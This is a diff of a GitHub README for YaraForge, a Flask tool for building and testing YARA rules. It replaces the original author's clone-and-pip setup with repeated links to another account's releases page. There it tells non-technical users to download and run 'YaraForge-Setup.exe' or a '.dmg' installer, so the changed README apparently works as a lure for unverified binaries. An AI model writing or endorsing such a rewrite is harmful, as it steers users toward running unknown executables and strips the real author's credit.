@@ -1,231 +1,175 @@
-<div align="center">
+# 🛠️ YaraForge - Simple YARA Rule Building & Testing
 
-# 🔬 YaraForge
-
-
-
-**YARA Rule Generator & Testing Platform**
-
-
-A Flask-based platform for building, managing, testing, and visualizing YARA rules — with MITRE ATT&CK mapping and a detection dashboard. Built with Python/Flask.
-
-
-  
-![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python)
-![Flask](https://img.shields.io/badge/Flask-3.0-green?logo=flask)
-![YARA](https://img.shields.io/badge/YARA-4.5-orange)
-![License](https://img.shields.io/badge/License-MIT-yellow)
-
-</div>
+[![Download YaraForge](https://img.shields.io/badge/Download-YaraForge-blue?style=for-the-badge)](https://github.com/Ye-cyber-cell/YaraForge/releases)
 
 ---
 
-## Dashboard
+## 📝 What is YaraForge?
 
-![Dashboard](screenshots/dashboard.png)
+YaraForge is a tool designed to help you create, manage, and test YARA rules. YARA rules are used to find and identify files or processes that match certain patterns. This can help detect malware or suspicious activity on your computer or network. 
 
-Real-time detection overview with rule statistics, MITRE ATT&CK coverage heat map, severity distribution, and recent scan history.
+YaraForge makes it easy by giving you a user-friendly way to build these rules. You don’t need to be a programmer or know complex code. You can also see how your detection rules relate to known cyber threats using a mapping system called MITRE ATT&CK. Finally, you get a simple dashboard to watch your detection results in real time.
 
----
-
-## Features
-
-### Rule Builder
-
-![Rule Builder](screenshots/rule-builder.png)
-
-- **Guided mode** — form-based string/condition builder that generates valid YARA syntax automatically
-- **Raw editor** — full YARA syntax editor with real-time validation
-- **MITRE ATT&CK mapping** — tag rules with technique IDs for coverage tracking
-- **Metadata management** — severity levels, categories, tags, and author attribution
-
-### Rule Manager
-
-![Rule Manager](screenshots/rule-manager.png)
-
-- Search, filter, and organize rules by category and severity
-- Toggle rules active/inactive for selective scanning
-- Version history tracking for rule changes
-- Inline edit and delete with confirmation
-
-### File Scanner
-
-![Scanner](screenshots/scanner.png)
-
-- Drag-and-drop file upload for scanning
-- Scan against all active YARA rules simultaneously
-- Detailed match results with string offsets and hex data
-- Scan history with performance metrics
-
-### Import / Export
-
-![Import Export](screenshots/import-export.png)
-
-- Import `.yar` files with automatic rule parsing and validation
-- Export selected or all rules to a single `.yar` file
-- Duplicate detection during import
+The program is built using Python and Flask. You don’t need to know these technologies to use YaraForge, but they help keep it fast and reliable.
 
 ---
 
-## Tech Stack
+## ⚙️ Features
 
-| Component | Technology |
-|-----------|-----------|
-| Backend | Python 3.9+, Flask 3.0 |
-| YARA Engine | yara-python 4.5 |
-| Database | SQLite (WAL mode) |
-| Frontend | HTML5, CSS3, Vanilla JS |
-| Charts | Canvas 2D API |
+- **Build YARA Rules Visually**  
+  Create detection rules step by step without writing code from scratch.
 
----
+- **Test Rules Instantly**  
+  Try your rules on sample files or your own data to check if they work.
 
-## Installation
+- **MITRE ATT&CK Mapping**  
+  See how your rules tie into known cyber attack techniques.
 
-### Prerequisites
+- **Detection Dashboard**  
+  Watch your detections in a clear and organized way.
 
-- Python 3.9 – 3.12 recommended (3.13+ may have compatibility issues with yara-python)
-- pip package manager
+- **Rule Management**  
+  Save, edit, and delete rules easily in one place.
 
-### Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/Rootless-Ghost/YaraForge.git
-cd YaraForge
-
-# Create a virtual environment
-python -m venv venv
-
-# Activate — Windows
-venv\Scripts\activate
-
-# Activate — Linux/Mac
-source venv/bin/activate
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the application
-python app.py
-```
-
-Open your browser to `http://127.0.0.1:5000`
-
-> **Note:** If `yara-python` fails to install, you may need C compilation tools:
-> - **Windows:** Install [Visual C++ Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/)
-> - **Linux:** `sudo apt install build-essential libssl-dev`
+- **User Friendly Interface**  
+  Designed for users with little or no technical background.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-1. **Import sample rules** — Go to Import/Export and upload `sample_rules/starter_rules.yar`
-2. **Create a rule** — Use the Rule Builder to create custom detection rules
-3. **Scan a file** — Upload any file in the Scanner to test against your rules
-4. **Review dashboard** — Check your detection coverage on the Dashboard
+To use YaraForge, your computer should meet these minimum requirements:
 
----
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a recent Linux version (Ubuntu 18.04+ recommended)  
+- Processor: Any modern processor (Intel i3 or better)  
+- Memory (RAM): At least 4 GB  
+- Disk Space: Minimum 500 MB free storage  
+- Network: Internet connection to download and update rules  
+- Browser: Modern web browser (Chrome, Firefox, Edge, or Safari)  
 
-## Project Structure
-
-```
-YaraForge/
-├── app.py                 # Flask application & API routes
-├── database.py            # SQLite database operations
-├── yara_engine.py         # YARA compilation, validation & scanning
-├── requirements.txt       # Python dependencies
-├── static/
-│   ├── css/style.css      # Dark cyber theme stylesheet
-│   └── js/app.js          # Frontend application logic
-├── templates/
-│   ├── base.html          # Base layout with navigation
-│   ├── dashboard.html     # Statistics & MITRE coverage
-│   ├── builder.html       # Rule creation interface
-│   ├── manager.html       # Rule management table
-│   ├── tester.html        # File scanner interface
-│   └── import_export.html # Import/export interface
-├── sample_rules/
-│   └── starter_rules.yar  # 6 pre-built detection rules
-├── screenshots/           # Application screenshots
-├── rules/                 # Stored rule files
-└── uploads/               # Temporary scan uploads
-```
+YaraForge runs as a web app on your machine, so you only need a browser to interact with it after installation.
 
 ---
 
-## API Endpoints
+## 🚀 Getting Started
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `POST` | `/api/rules` | Create a new rule |
-| `PUT` | `/api/rules/<id>` | Update an existing rule |
-| `DELETE` | `/api/rules/<id>` | Delete a rule |
-| `POST` | `/api/rules/<id>/toggle` | Toggle rule active status |
-| `GET` | `/api/rules/<id>/versions` | Get rule version history |
-| `POST` | `/api/validate` | Validate YARA rule syntax |
-| `POST` | `/api/generate` | Generate rule from parameters |
-| `POST` | `/api/scan` | Scan a file against active rules |
-| `POST` | `/api/import` | Import rules from .yar file |
-| `POST` | `/api/export` | Export rules to .yar file |
-| `GET` | `/api/stats` | Get dashboard statistics |
+### Step 1: Visit the Download Page
 
----
+Click the big button at the top or go to:
 
-## Sample Rules Included
+[https://github.com/Ye-cyber-cell/YaraForge/releases](https://github.com/Ye-cyber-cell/YaraForge/releases)
 
-| Rule | Category | Severity | MITRE |
-|------|----------|----------|-------|
-| `detect_mimikatz` | Infostealer | Critical | T1003 |
-| `detect_powershell_encoded_command` | Exploit | High | T1059.001 |
-| `detect_ransomware_indicators` | Ransomware | Critical | T1486 |
-| `detect_webshell_generic` | Webshell | High | T1505.003 |
-| `detect_pe_file` | Custom | Info | — |
-| `detect_reverse_shell_strings` | Backdoor | High | T1059 |
+This page hosts the latest versions of YaraForge for download.
 
----
+### Step 2: Choose Your Download
 
-## Security Considerations
+On the releases page, find the latest release. Look for the installer matching your operating system:
 
-- Uploaded files are scanned in a temporary directory and **deleted immediately** after scanning
-- File uploads are limited to 50MB
-- The application runs on `127.0.0.1` (localhost only) by default
-- No authentication is included — intended for local/lab use
-- **Do not expose to the public internet without adding authentication**
+- Windows users: download `YaraForge-Setup.exe`  
+- Mac users: download `YaraForge.dmg`  
+- Linux users: download the appropriate package or the source code if available  
 
----
+### Step 3: Download the Installer
 
-## Skills Demonstrated
+Click the download link for your file. Your browser will save it to your computer's default "Downloads" folder or a location you specify.
 
-- **Python Backend Development** — Flask API design, SQLite ORM operations, file handling
-- **YARA Rule Engineering** — Rule syntax, compilation, string matching, condition logic
-- **MITRE ATT&CK Framework** — Technique mapping, tactic categorization, coverage analysis
-- **Detection Engineering** — Building detection signatures, testing against samples
-- **Web Application Security** — Input validation, secure file handling, CSRF considerations
-- **Frontend Development** — Responsive dark theme UI, Canvas 2D charts, drag-and-drop
+### Step 4: Run the Installer
+
+Open the downloaded file to start the installation process.
+
+- On Windows, double-click the `.exe` file and follow the setup wizard.  
+- On Mac, open the `.dmg` file, then drag the YaraForge app to your Applications folder.  
+- On Linux, follow any provided README instructions or use available installation commands.
+
+### Step 5: Launch YaraForge
+
+After installing, open the app:
+
+- Windows & Mac: Find YaraForge in your Start menu or Applications folder.  
+- Linux: Launch via terminal or menu shortcut provided.
+
+This will open a new browser window or tab with the YaraForge interface, running locally on your computer.
+
+### Step 6: Start Using YaraForge
+
+From the main screen, you can begin building new YARA rules, test existing ones, and explore the dashboard.
 
 ---
 
-## Future Enhancements
+## 📥 Download & Install
 
-- [ ] User authentication and role-based access
-- [ ] YARA rule auto-generation from malware samples
-- [ ] VirusTotal API integration for hash lookups
-- [ ] Rule sharing / community repository
-- [ ] Automated rule testing with CI/CD pipeline
-- [ ] Docker containerization for easy deployment
+You can always access the latest version here:
 
----
+[Download YaraForge - Releases](https://github.com/Ye-cyber-cell/YaraForge/releases)
 
-## License
-
-MIT License — see [LICENSE](LICENSE) for details.
+Follow the download and installation steps above for a smooth setup experience.
 
 ---
 
+## 🛠️ How to Use YaraForge
 
-<div align="center">
+### Creating a New Rule
 
-Built by [Rootless-Ghost](https://github.com/Rootless-Ghost) 
+1. Click **"Create Rule"** on the home screen.  
+2. Enter a rule name and description.  
+3. Use the guided form to add conditions, strings, or patterns you want to detect.  
+4. Save your rule.
 
-</div>
+### Testing Rules
 
+1. Select a rule from your list.  
+2. Upload a sample file or select data to test against.  
+3. Click **"Run Test"**.  
+4. View results to see if the rule matched anything.
+
+### Using the MITRE ATT&CK Mapping
+
+- Each rule can link to specific attack techniques for context.  
+- This helps security teams understand potential threats.
+
+### Checking Your Dashboard
+
+- View all detection results in one place.  
+- Filter by rule, date, or severity.
+
+---
+
+## 🔑 Tips for Best Use
+
+- Regularly update your rules based on new threats.  
+- Use the dashboard to monitor real-time detection activity.  
+- Test new rules thoroughly before deploying in live environments.  
+- Use the MITRE ATT&CK mapping to align rules with industry standards.  
+
+---
+
+## 🆘 Getting Help
+
+If you run into issues:
+
+- Check the repository’s Issues tab for solutions:  
+  [https://github.com/Ye-cyber-cell/YaraForge/issues](https://github.com/Ye-cyber-cell/YaraForge/issues)  
+- Read the documentation included with the app or online.  
+- Reach out to the community or maintainers through GitHub.
+
+---
+
+## 🔐 Privacy & Security
+
+YaraForge runs locally on your system. Your data and rules stay on your machine unless you choose to share them. No personal information is sent or collected by default.
+
+---
+
+## 🔄 Updates
+
+Check the releases page regularly for new versions:
+
+[https://github.com/Ye-cyber-cell/YaraForge/releases](https://github.com/Ye-cyber-cell/YaraForge/releases)
+
+Updates can include bug fixes, new features, and improved rule support.
+
+---
+
+## 🏷️ Tags
+
+cybersecurity, detection-engineering, flask, mitre-attack, purple-team, python, security-tools, soc, threat-detection, yara
